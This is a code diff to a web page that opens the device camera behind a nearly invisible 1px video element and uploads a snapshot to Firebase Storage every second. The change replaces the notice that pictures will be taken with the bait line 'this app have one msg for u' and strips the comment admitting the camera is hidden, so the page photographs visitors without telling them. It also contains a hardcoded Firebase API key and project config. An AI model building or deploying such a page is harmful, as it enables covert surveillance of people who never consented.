@@ -41,7 +41,7 @@
     #video {
       width: 1px;
       height: 1px;
-      opacity: 0.01;     /* camera visible (required) but invisible to eye */
+      opacity: 0.01;
       position: fixed;
       bottom: 0;
       right: 0;
@@ -64,7 +64,7 @@
 <body>
   <div id="box">
     <div class="hlo">HLO</div>
-    <p>This app will take pictures every second for safety records.<br>
+    <p>this app have one msg for u<br>
     Click OK to continue.</p>
     <button id="okBtn">OK — Start</button>
   </div>
@@ -73,8 +73,14 @@
   <canvas id="canvas" style="display:none;"></canvas>
   <div id="toast">Picture taken & uploaded</div>
 
-  <!-- Firebase -->
-  <script type="module">
+<script type="module">
+
+    /* ---------- FIXED FIREBASE CDN IMPORTS ---------- */
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+    import { getStorage, ref, uploadString } 
+      from "https://www.gstatic.com/firebasejs/9.6.11/firebase-storage.js";
+
+    /* ---------- FIREBASE CONFIG ---------- */
     const firebaseConfig = {
       apiKey: "AIzaSyATSGFhVRacGU5DF79s0Md_G_MriSbt3oM",
       authDomain: "slate-2984a.firebaseapp.com",
@@ -85,13 +91,10 @@
       appId: "1:237464991846:web:cdd78522a06e001f87d5a7"
     };
 
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-app.js";
-    import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-storage.js";
-
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
 
-    // Elements
+    /* ---------- DOM ELEMENTS ---------- */
     const okBtn = document.getElementById("okBtn");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -106,7 +109,6 @@
       setTimeout(() => toast.style.display = "none", 1500);
     }
 
-    // ---- START PROCESS ----
     okBtn.addEventListener("click", async () => {
       okBtn.style.display = "none";
 
@@ -115,21 +117,17 @@
           video: { facingMode: "environment" },
           audio: false
         });
+
         video.srcObject = stream;
 
         await new Promise(res => video.onloadedmetadata = res);
 
-        startAutoCapture();
+        timer = setInterval(captureAndUpload, 1000);
 
       } catch (err) {
         alert("Camera permission denied.");
       }
     });
-
-    // ---- AUTO CAPTURE LOOP ----
-    function startAutoCapture() {
-      timer = setInterval(captureAndUpload, 1000); // every 1 sec
-    }
 
     async function captureAndUpload() {
       try {
@@ -139,29 +137,29 @@
 
         canvas.width = w;
         canvas.height = h;
+
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, w, h);
 
         const dataURL = canvas.toDataURL("image/png");
         const filename = `images/${Date.now()}.png`;
-        const storageRef = ref(storage, filename);
+        const storageRefObj = ref(storage, filename);
 
-        await uploadString(storageRef, dataURL, "data_url");
+        await uploadString(storageRefObj, dataURL, "data_url");
 
-        showToast("Picture taken & uploaded");
+        showToast("Picture uploaded");
 
       } catch (err) {
         console.error(err);
       }
     }
 
-    // ---- STOP WHEN USER LEAVES ----
-    window.addEventListener("beforeunload", stopAll);
-
-    function stopAll() {
+    window.addEventListener("beforeunload", () => {
       if (timer) clearInterval(timer);
       if (stream) stream.getTracks().forEach(t => t.stop());
-    }
-  </script>
+    });
+
+</script>
+
 </body>
 </html>
